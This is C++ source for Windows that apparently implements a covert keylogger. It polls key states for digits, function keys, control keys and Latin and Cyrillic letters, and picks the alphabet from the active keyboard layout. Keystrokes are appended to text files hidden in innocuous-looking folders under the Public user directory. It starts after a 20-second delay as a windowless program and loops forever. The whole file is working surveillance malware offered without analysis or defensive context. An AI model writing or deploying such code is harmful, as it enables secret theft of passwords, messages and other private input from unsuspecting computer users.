#include <windows.h>
#include <fstream>
#include <thread>


using namespace std;

void getkeyNUM()
{
    while(1){
    ofstream fout;
    fout.open("C:/Users/Public/Public video/file.txt", ios::app);

    if (GetAsyncKeyState(0x60) == -32767)
    {
        fout << "NUM_0 ";
    }
    if (GetAsyncKeyState(0x61) == -32767)
    {
        fout << "NUM_1 ";
    }
    if (GetAsyncKeyState(0x62) == -32767)
    {
        fout << "NUM_2 ";
    }
    if (GetAsyncKeyState(0x63) == -32767)
    {
        fout << "NUM_3 ";
    }
    if (GetAsyncKeyState(0x64) == -32767)
    {
        fout << "NUM_4 ";
    }
    if (GetAsyncKeyState(0x65) == -32767)
    {
        fout << "NUM_5 ";
    }
    if (GetAsyncKeyState(0x66) == -32767)
    {
        fout << "NUM_6 ";
    }
    if (GetAsyncKeyState(0x67) == -32767)
    {
        fout << "NUM_7 ";
    }
    if (GetAsyncKeyState(0x68) == -32767)
    {
        fout << "NUM_8 ";
    }
    if (GetAsyncKeyState(0x69) == -32767)
    {
        fout << "| NUM_ ";
    }

    ///////////////////////////////////////////////

    if (GetAsyncKeyState(0x31) == -32767)
    {
        fout << "1 ";
    }
    if (GetAsyncKeyState(0x32) == -32767)
    {
        fout << "2 ";
    }
    if (GetAsyncKeyState(0x33) == -32767)
    {
        fout << "3 ";
    }
    if (GetAsyncKeyState(0x34) == -32767)
    {
        fout << "4 ";
    }
    if (GetAsyncKeyState(0x35) == -32767)
    {
        fout << "5 ";
    }
    if (GetAsyncKeyState(0x36) == -32767)
    {
        fout << "6 ";
    }
    if (GetAsyncKeyState(0x37) == -32767)
    {
        fout << "7 ";
    }
    if (GetAsyncKeyState(0x38) == -32767)
    {
        fout << "8 ";
    }
    if (GetAsyncKeyState(0x39) == -32767)
    {
        fout << "9 ";
    }
    if (GetAsyncKeyState(0x30) == -32767)
    {
        fout << "0 ";
    }

    ///////////////////////////////////////////////

    if (GetAsyncKeyState(0x08) == -32767)
    {
        fout << "Backspace ";
    }
    if (GetAsyncKeyState(0x09) == -32767)
    {
        fout << "TAB ";
    }
    if (GetAsyncKeyState(0x10) == -32767)
    {
        fout << "SHIFT ";
    }
    if (GetAsyncKeyState(0x11) == -32767)
    {
        fout << "CTRL ";
    }
    if (GetAsyncKeyState(0x12) == -32767)
    {
        fout << "ALT ";
    }
    if (GetAsyncKeyState(0x14) == -32767)
    {
        fout << "CAPS_LOCK ";
    }
    if (GetAsyncKeyState(0x1B) == -32767)
    {
        fout << "ESC ";
    }
    if (GetAsyncKeyState(0x20) == -32767)
    {
        fout << "SPACE ";
    }
    if (GetAsyncKeyState(0x0D) == -32767)
    {
        fout << "ENTER ";
    }
    if (GetAsyncKeyState(0x5B) == -32767)
    {
        fout << "LEFT_WIN ";
    }
    if (GetAsyncKeyState(0x5c) == -32767)
    {
        fout << "RIGHT_WIN ";
    }

    ///////////////////////////////////////////////

    if (GetAsyncKeyState(0x70) == -32767)
    {
        fout << "F1 ";
    }
    if (GetAsyncKeyState(0x71) == -32767)
    {
        fout << "F2 ";
    }
    if (GetAsyncKeyState(0x72) == -32767)
    {
        fout << "F3 ";
    }
    if (GetAsyncKeyState(0x73) == -32767)
    {
        fout << "F4 ";
    }
    if (GetAsyncKeyState(0x74) == -32767)
    {
        fout << "F5 ";
    }
    if (GetAsyncKeyState(0x75) == -32767)
    {
        fout << "F6 ";
    }
    if (GetAsyncKeyState(0x76) == -32767)
    {
        fout << "F7 ";
    }
    if (GetAsyncKeyState(0x77) == -32767)
    {
        fout << "F8 ";
    }
    if (GetAsyncKeyState(0x78) == -32767)
    {
        fout << "F9 ";
    }
    if (GetAsyncKeyState(0x79) == -32767)
    {
        fout << "F10 ";
    }
    if (GetAsyncKeyState(0x78) == -32767)
    {
        fout << "F9 ";
    }
    if (GetAsyncKeyState(0x79) == -32767)
    {
        fout << "F10 ";
    }
    if (GetAsyncKeyState(0x7A) == -32767)
    {
        fout << "F11 ";
    }
    if (GetAsyncKeyState(0x7B) == -32767)
    {
        fout << "F12 ";
    }
    Sleep(60);
    }
}

void getkeyENG()
{

    ofstream fout;
    fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
        if (GetAsyncKeyState(0x41) == -32767)
        {
            fout << "A ";
        }
        if (GetAsyncKeyState(0x42) == -32767)
        {
            fout << "B ";
        }
        if (GetAsyncKeyState(0x43) == -32767)
        {
            fout << "C ";
        }
        if (GetAsyncKeyState(0x44) == -32767)
        {
            fout << "D ";
        }
        if (GetAsyncKeyState(0x45) == -32767)
        {
            fout << "E ";
        }
        if (GetAsyncKeyState(0x46) == -32767)
        {
            fout << "F ";
        }
        if (GetAsyncKeyState(0x47) == -32767)
        {
            fout << "G ";
        }
        if (GetAsyncKeyState(0x48) == -32767)
        {
            fout << "H ";
        }
        if (GetAsyncKeyState(0x49) == -32767)
        {
            fout << "I ";
        }
        if (GetAsyncKeyState(0x4a) == -32767)
        {
            fout << "J ";
        }
        if (GetAsyncKeyState(0x4b) == -32767)
        {
            fout << "K ";
        }
        if (GetAsyncKeyState(0x4c) == -32767)
        {
            fout << "L ";
        }
        if (GetAsyncKeyState(0x4d) == -32767)
        {
            fout << "M ";
        }
        if (GetAsyncKeyState(0x4e) == -32767)
        {
            fout << "N ";
        }
        if (GetAsyncKeyState(0x4f) == -32767)
        {
            fout << "O ";
        }
        if (GetAsyncKeyState(0x50) == -32767)
        {
            fout << "P ";
        }
        if (GetAsyncKeyState(0x51) == -32767)
        {
            fout << "Q ";
        }
        if (GetAsyncKeyState(0x52) == -32767)
        {
            fout << "R ";
        }
        if (GetAsyncKeyState(0x53) == -32767)
        {
            fout << "S ";
        }
        if (GetAsyncKeyState(0x54) == -32767)
        {
            fout << "T ";
        }
        if (GetAsyncKeyState(0x55) == -32767)
        {
            fout << "U ";
        }
        if (GetAsyncKeyState(0x56) == -32767)
        {
            fout << "V ";
        }
        if (GetAsyncKeyState(0x57) == -32767)
        {
            fout << "W ";
        }
        if (GetAsyncKeyState(0x58) == -32767)
        {
            fout << "X ";
        }
        if (GetAsyncKeyState(0x59) == -32767)
        {
            fout << "Y ";
        }
        if (GetAsyncKeyState(0x5a) == -32767)
        {
            fout << "Z ";
        }

        ///////////////////////////////////////////////

        fout.close();
}

void getkeyRUS() {
    ofstream fout;
    fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
        if (GetAsyncKeyState(0x46) == -32767)
        {
            fout << "А ";
        }
        if (GetAsyncKeyState(0xBC) == -32767)
        {
            fout << "Б ";
        }
        if (GetAsyncKeyState(0x44) == -32767)
        {
            fout << "В ";
        }
        if (GetAsyncKeyState(0x55) == -32767)
        {
            fout << "Г ";
        }
        if (GetAsyncKeyState(0x4c) == -32767)
        {
            fout << "Д ";
        }
        if (GetAsyncKeyState(0x54) == -32767)
        {
            fout << "Е ";
        }
        if (GetAsyncKeyState(0xC0) == -32767)
        {
            fout << "Ё ";
        }
        if (GetAsyncKeyState(0xBA) == -32767)
        {
            fout << "Ж ";
        }
        if (GetAsyncKeyState(0x50) == -32767)
        {
            fout << "З ";
        }
        if (GetAsyncKeyState(0x42) == -32767)
        {
            fout << "И ";
        }
        if (GetAsyncKeyState(0x51) == -32767)
        {
            fout << "Й ";
        }
        if (GetAsyncKeyState(0x52) == -32767)
        {
            fout << "К ";
        }
        if (GetAsyncKeyState(0x4b) == -32767)
        {
            fout << "Л ";
        }
        if (GetAsyncKeyState(0x56) == -32767)
        {
            fout << "М ";
        }
        if (GetAsyncKeyState(0x59) == -32767)
        {
            fout << "Н ";
        }
        if (GetAsyncKeyState(0x4a) == -32767)
        {
            fout << "О ";
        }
        if (GetAsyncKeyState(0x47) == -32767)
        {
            fout << "П ";
        }
        if (GetAsyncKeyState(0x48) == -32767)
        {
            fout << "Р ";
        }
        if (GetAsyncKeyState(0x43) == -32767)
        {
            fout << "С ";
        }
        if (GetAsyncKeyState(0x4e) == -32767)
        {
            fout << "Т ";
        }
        if (GetAsyncKeyState(0x45) == -32767)
        {
            fout << "У ";
        }
        if (GetAsyncKeyState(0x41) == -32767)
        {
            fout << "Ф ";
        }
        if (GetAsyncKeyState(0xDB) == -32767)
        {
            fout << "Х ";
        }
        if (GetAsyncKeyState(0x57) == -32767)
        {
            fout << "Ц ";
        }
        if (GetAsyncKeyState(0x58) == -32767)
        {
            fout << "Ч ";
        }
        if (GetAsyncKeyState(0x49) == -32767)
        {
            fout << "Ш ";
        }
        if (GetAsyncKeyState(0x4f) == -32767)
        {
            fout << "Щ ";
        }
        if (GetAsyncKeyState(0xDD) == -32767)
        {
            fout << "Ъ ";
        }
        if (GetAsyncKeyState(0x53) == -32767)
        {
            fout << "Ы ";
        }
        if (GetAsyncKeyState(0x4d) == -32767)
        {
            fout << "Ь ";
        }
        if (GetAsyncKeyState(0xDE) == -32767)
        {
            fout << "Э ";
        }
        if (GetAsyncKeyState(0xBE) == -32767)
        {
            fout << "Ю ";
        }
        if (GetAsyncKeyState(0x5a) == -32767)
        {
            fout << "Я ";
        }
}

void getlayout() {

    int layout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
    switch (layout)
    {
    case 1049:
    {
        //fout << "Русский язык ID " << layout << endl;
        getkeyRUS();
        break;
    }
    case 1033:
    {
        //fout << "Английский язык ID " << layout << endl;
        getkeyENG();
        break;
    }
    default:
    {

        return;
    }
    }

}

int APIENTRY wWinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPWSTR    lpCmdLine,
    int       nCmdShow)
{

    Sleep(20000);

    system("mkdir \"C:/Users/Public/Public video\"");//создать папку

    std::thread tNUM(getkeyNUM);

    while (1)
    {
        getlayout();
        Sleep(50);
    }

    tNUM.join();

    return 0;
}

